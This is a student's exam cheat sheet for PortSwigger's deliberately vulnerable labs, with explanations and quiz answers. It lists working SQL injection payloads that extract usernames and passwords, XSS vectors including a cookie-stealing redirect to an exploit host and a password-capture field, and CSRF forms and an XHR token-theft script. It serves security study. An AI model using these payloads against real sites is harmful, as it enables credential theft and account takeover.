# Exam Study — PortSwigger Labs Cheat Sheet (SQLi · XSS · CSRF)

**Source:** PortSwigger Labs — Beginner, Browser-Only Walkthroughs (SQL injection, XSS, CSRF)
**Tools:** Browser + DevTools (F12) only — no Burp, no coding.
**Course:** [[CS451 - Hub|CS451 – Network Security Fundamentals]]
**Tags:** #CS451 #exam #lab #portswigger #sqli #xss #csrf #payloads

> **Authorized use only** — these techniques are for PortSwigger's deliberately-vulnerable labs and systems you're permitted to test.

---

## Quick Lookup Index

**Sections:**
1. The Basics (tools, exploit server)
2. SQL Injection — all labs + payloads
3. Cross-Site Scripting (XSS) — all labs + payloads
4. CSRF — all labs + payloads
5. Deep Dive: UNION column-count, blind SQLi, XSS filter bypass
6. Master Payload Reference

**Key Terms:** payload, address bar, DevTools (F12), Console, Network, Edit and Resend, Storage/Application → Cookies, exploit server, Store/View exploit/Deliver to victim, `'--`, `ORDER BY`, `UNION SELECT`, `information_schema`, `@@version`, blind SQLi, `pg_sleep`, `<script>alert(1)</script>`, `onerror`, `onload`, `onfocus`, `svg`, `document.cookie`, CSP, `csrf` token, double-submit, Referer

---

## 1. The Basics

These labs are vulnerable practice sites. You play the **attacker**: find a badly-handled input and type a **payload**. Success = green "Solved" banner.

**Three tools (all in browser):**
1. **Address bar** — many payloads go straight into the URL.
2. **The page** — search boxes, login forms, comment boxes.
3. **DevTools (F12):**
   - **Console** — type JS, see errors.
   - **Network** — see every request; right-click → **Edit and Resend** (Firefox) to replay/modify.
   - **Storage** (Firefox) / **Application** (Chrome) → **Cookies** — double-click to edit values.
   - **Inspector / Elements** — see live HTML, find where your input landed.

**Exploit server** (some labs): a second site with a text box + **Store**, **View exploit** (test on yourself), **Deliver to victim** (run against simulated victim to solve).

`LAB-ID` = your lab's web address (copy from address bar).

---

## 2. SQL Injection

*(Tricking the DB by typing SQL into normal inputs.)*

| Lab | Goal | Payload / Steps |
|---|---|---|
| **1.1** Retrieve hidden data | Reveal unreleased products | `?category=Gifts'--` |
| **1.2** Login bypass | Log in as admin | Username `administrator'--`, password blank |
| **1.3** DB version (Oracle) | Show version | columns: `'+ORDER+BY+1--`,`2--`… ; `'+UNION+SELECT+banner,NULL+FROM+v$version--` |
| **1.4** DB version (MySQL/MS) | Show version | `'+UNION+SELECT+@@version,NULL#` |
| **1.5** List DB contents (non-Oracle) | Get admin creds | tables: `'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--` → columns: `...information_schema.columns+WHERE+table_name='users_abcde'--` → data: `'+UNION+SELECT+username_xxxx,password_xxxx+FROM+users_abcde--` |
| **1.6** List DB contents (Oracle) | Get admin creds | `all_tables`, `all_tab_columns` (UPPERCASE catalogs) |
| **1.7** UNION column count | Find # columns | `'+ORDER+BY+1--`,`2--`… until error; cross-check `'+UNION+SELECT+NULL--`,`NULL,NULL--`… |
| **1.8** UNION find text column | Find string column | rotate marker: `'+UNION+SELECT+'abc',NULL,NULL--` → `NULL,'abc',NULL--` … |
| **1.9** UNION other tables | Read creds | `'+UNION+SELECT+username,password+FROM+users--` |
| **1.10** UNION one column | Both fields in one col | `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` |
| **1.11** Blind — conditional responses | Extract password | edit `TrackingId` cookie; tell: `' AND '1'='1` vs `' AND '1'='2`; `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` |
| **1.12** Blind — conditional errors | Extract password | `' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)=''--` (error=true) |
| **1.13** Visible error-based | Extract password | add `'` for verbose error; `' AND CAST((SELECT password FROM users LIMIT 1) AS int)--` |
| **1.14** Blind — time delay (prove) | Trigger delay | `'||pg_sleep(10)--` (~10s pause) |
| **1.15** Blind — time delay + data | Extract password | `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` |
| **1.16/1.17** OAST | (DNS/HTTP exfil) | **Skip if browser-only** — needs Burp Collaborator |
| **1.18** Filter bypass (XML) | Bypass WAF | Edit XML req; `1 UNION SELECT username||'~'||password FROM users`; if blocked, HTML-encode keyword letters: `&#x53;ELECT`, `&#x55;NION` |

---

## 3. Cross-Site Scripting (XSS)

*(Run your own JS on the site. Success = `alert()` fires.)*

| Lab | Context | Payload |
|---|---|---|
| **2.1** Reflected, no encoding | search box | `<script>alert(1)</script>` |
| **2.2** Stored, no encoding | blog comment | `<script>alert(1)</script>` |
| **2.3** DOM `document.write` (img src) | search | `"><svg onload=alert(1)>` |
| **2.4** DOM `innerHTML` | search | `<img src=1 onerror=alert(1)>` |
| **2.5** DOM jQuery href | URL | `?returnPath=javascript:alert(document.cookie)` |
| **2.6** DOM jQuery selector (hashchange) | exploit server | `<iframe src="https://LAB-ID/#" onload="this.src+='<img src=1 onerror=alert(1)>'"></iframe>` |
| **2.7** Attribute, brackets encoded | search | `" autofocus onfocus=alert(1) x="` |
| **2.8** Anchor href, quotes encoded | website field | `javascript:alert(1)` |
| **2.9** JS string, brackets encoded | search | `'-alert(1)-'` |
| **2.10** `document.write` in `<select>` | URL | `?storeId="></select><img src=1 onerror=alert(1)>` |
| **2.11** AngularJS expression | search | `{{$on.constructor('alert(1)')()}}` |
| **2.12** Reflected DOM (eval) | search | `\"-alert(1)}//` |
| **2.13** Stored DOM (strips 1st brackets) | comment | `<><img src=1 onerror=alert(1)>` |
| **2.14** Most tags blocked → `print()` | exploit server | `<body onresize=print()>` via iframe |
| **2.15** Only custom tags | exploit server | `<xss id=x onfocus=alert(document.cookie) tabindex=1>#x` via iframe |
| **2.16** Some SVG allowed | search | `<svg><animatetransform onbegin=alert(1)></svg>` |
| **2.17** Canonical link tag | URL | `?'accesskey='X'onclick='alert(1)` then **ALT+SHIFT+X** |
| **2.18** JS string, quotes escaped, tags allowed | search | `</script><script>alert(1)</script>` |
| **2.19** JS string, single-quote escaped | search | `\'-alert(1)//` |
| **2.20** onclick, multi-encoding | website field | `http://foo?&apos;-alert(1)-&apos;` |
| **2.21** template literal | search | `${alert(1)}` |
| **2.22** **Steal cookies** | comment | `<script>document.location='https://LAB-ID-exploit/?c='+document.cookie</script>` |
| **2.23** **Capture passwords** | comment | `<input name=username><input type=password name=password onchange="document.location='https://LAB-ID-exploit/?p='+this.value">` |
| **2.24** **XSS→CSRF** (steal token) | comment | XHR reads `/my-account` for csrf token, then POSTs change-email (see playbook) |

---

## 4. CSRF

*(Trick a logged-in victim's browser into submitting a request — here, changing their email. Every lab: paste HTML on exploit server → Store → View exploit → Deliver to victim.)*

| Lab | Defense bypassed | Payload |
|---|---|---|
| **3.1** No defenses | — | auto-submitting `<form>` to `change-email` + `<script>document.forms[0].submit()</script>` |
| **3.2** Token on POST not GET | method | `<img src="https://LAB-ID/my-account/change-email?email=pwned@evil.com">` |
| **3.3** Token only validated if present | omit token | 3.1 form with the `csrf` line deleted |
| **3.4** Token not tied to session | reuse | grab a valid `csrf` (F12 Network), paste into the form |
| **3.5** Token tied to non-session cookie | plant cookie | inject attacker cookie + matching token |
| **3.6** Double-submit (token=cookie) | set both equal | form `csrf=fake` + `<img ...Set-Cookie: csrf=fake...>` |
| **3.7** Referer checked only if present | suppress | `<meta name="referrer" content="no-referrer">` + form |
| **3.8** Broken Referer (contains domain) | spoof | `<script>history.pushState('','','/?https://LAB-ID')</script>` + form + `Referrer-Policy: unsafe-url` |

---

## 5. Deep Dive

**UNION attack fundamentals.** A UNION appends a second result set to the first; it only works if (a) the two SELECTs return the **same number of columns**, and (b) the column **data types are compatible**. Hence the two preliminary steps: find the column count (`ORDER BY n` until error, or `UNION SELECT NULL,NULL...` until it loads) and find which column holds **text** (rotate a string marker like `'abc'` through each slot). Only then can you place real data (`username`,`password`) in a text-capable column. MySQL comment is `#` or `-- ` (with space); Oracle requires `FROM dual` for dual-less selects and UPPERCASE catalogs (`all_tables`).

**Blind SQLi** = no data returned, only a behavioral *tell*. Three tells: a **boolean** difference (page shows "Welcome back" or not → 1.11), an **error** difference (`1/0` throws only when condition true → 1.12), or a **time** difference (`pg_sleep(10)` only fires when true → 1.14/1.15). You then extract the password **one character at a time** with `SUBSTRING(password,1,1)='a'`, incrementing the position. Slow but fully browser-doable.

**XSS context determines the payload.** If your input lands in plain HTML body → `<script>` or `<img onerror>`. Inside an **attribute** → break out with `"` then add an event handler (`onfocus`, `onresize`). Inside a **JS string** → break out with `'` or `</script>`. When tags/attributes are filtered, fall back to whatever survives: SVG animation tags (`animatetransform/onbegin`), custom tags with `onfocus`, or `accesskey`. The universal goal is to get an **event handler or script** to execute `alert()`.

**XSS→CSRF (2.24)** shows why XSS defeats CSRF tokens: the attacker's JS runs **in the victim's origin**, so it can simply **read the CSRF token out of the DOM** (`/my-account` page) and then submit a valid request — the token never protected against same-origin script.

**CSRF defenses, in order of strength.** Anti-CSRF tokens (must be **unpredictable**, **tied to the session**, and **validated on every state-changing request including GET**) — labs 3.2–3.6 each exploit a *missing* one of those properties. SameSite cookies and Referer checks are secondary; 3.7/3.8 show Referer validation is fragile when it's optional or substring-based.

---

## 6. Master Payload Reference

```
# SQLi quick hits
'--                                   # comment out rest
administrator'--                      # login bypass (username)
'+UNION+SELECT+NULL,NULL--            # column-count probe
'+UNION+SELECT+username,password+FROM+users--
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--   # one-column
@@version  /  v$version / banner      # version (MySQL / Oracle)
information_schema.tables / .columns  # enumerate schema (non-Oracle)
' AND '1'='1   vs   ' AND '1'='2      # blind boolean tell
'||pg_sleep(10)--                     # blind time tell

# XSS quick hits
<script>alert(1)</script>             # plain
<img src=1 onerror=alert(1)>          # innerHTML / no-script
"><svg onload=alert(1)>               # break out then svg
" autofocus onfocus=alert(1) x="      # attribute context
'-alert(1)-'                          # JS string context
${alert(1)}                           # template literal
<script>document.location='https://EXPLOIT/?c='+document.cookie</script>  # steal cookie

# CSRF (exploit server)
<form action="https://LAB-ID/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil.com">
</form>
<script>document.forms[0].submit()</script>

<img src="https://LAB-ID/my-account/change-email?email=pwned@evil.com">   # GET-only token
```
```html
<!-- 2.24 XSS -> CSRF: read token from DOM, then POST -->
<script>
var r=new XMLHttpRequest();
r.onload=function(){
  var t=/name="csrf" value="([^"]+)"/.exec(this.responseText)[1];
  var c=new XMLHttpRequest();
  c.open('POST','/my-account/change-email',true);
  c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  c.send('csrf='+t+'&email=pwned@evil.com');
};
r.open('GET','/my-account',true);r.send();
</script>
```

---

## Knowledge Check Q&A

**Q1:** What are the two preliminary steps before a UNION data-extraction attack?
**A:** (1) Determine the number of columns (`ORDER BY n--` until error, or `UNION SELECT NULL,...`); (2) find which column accepts **text** (rotate a string marker).

**Q2:** A page shows no output and no error, but you suspect SQLi. How do you confirm it?
**A:** **Time-based blind**: inject `'||pg_sleep(10)--` and watch for a ~10s delay.

**Q3:** Your XSS input lands inside an HTML attribute and `<>` are blocked. What do you do?
**A:** Break out of the attribute with `"` and add an event handler, e.g. `" autofocus onfocus=alert(1) x="`.

**Q4:** Why does an XSS vulnerability defeat CSRF token protection (lab 2.24)?
**A:** The injected JS runs in the victim's origin, so it can read the CSRF token from the DOM and submit a valid request.

**Q5:** Which CSRF property does lab 3.4 exploit?
**A:** The token is **not tied to the user session**, so a valid token from one session can be reused.

**Q6:** Which two SQLi labs cannot be solved browser-only and why?
**A:** 1.16 and 1.17 (OAST) — they need the DB to make an external DNS/HTTP request a browser can't receive; they require Burp Collaborator.

---

## Graph View Links

**Previous**: [[Exam Study - SocialNet Security Lab (ATT-1 to ATT-7)]]
**Next**: —
**Hub**: [[CS451 - Hub]]
**Related**: [[Exam Study - Web Application Security]], [[Exam Study - Module 3 (Threats and Attacks on Endpoints)]]
